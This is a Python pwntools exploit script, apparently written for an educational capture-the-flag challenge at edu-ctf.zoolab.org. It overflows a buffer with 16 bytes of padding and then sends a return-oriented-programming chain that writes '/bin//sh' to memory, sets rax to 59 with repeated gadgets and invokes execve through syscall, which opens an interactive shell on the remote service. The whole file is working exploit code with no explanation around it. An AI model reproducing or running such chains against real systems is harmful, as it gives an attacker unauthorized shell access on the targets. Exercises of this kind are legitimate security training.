from struct import pack
from pwn import process, remote, pause 

# io = process('./src/share/chal')
# io = remote('localhost', 10203)
io = remote('edu-ctf.zoolab.org', 10204)
# Padding goes here
p = b'A' * 16

p += pack('<Q', 0x000000000040f23e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x0000000000449547) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047be45) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f23e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443ba0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047be45) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401912) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f23e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443ba0) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470e70) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040101a)
p += pack('<Q', 0x00000000004012d3) # syscall

pause()

io.sendline(p)
io.interactive()
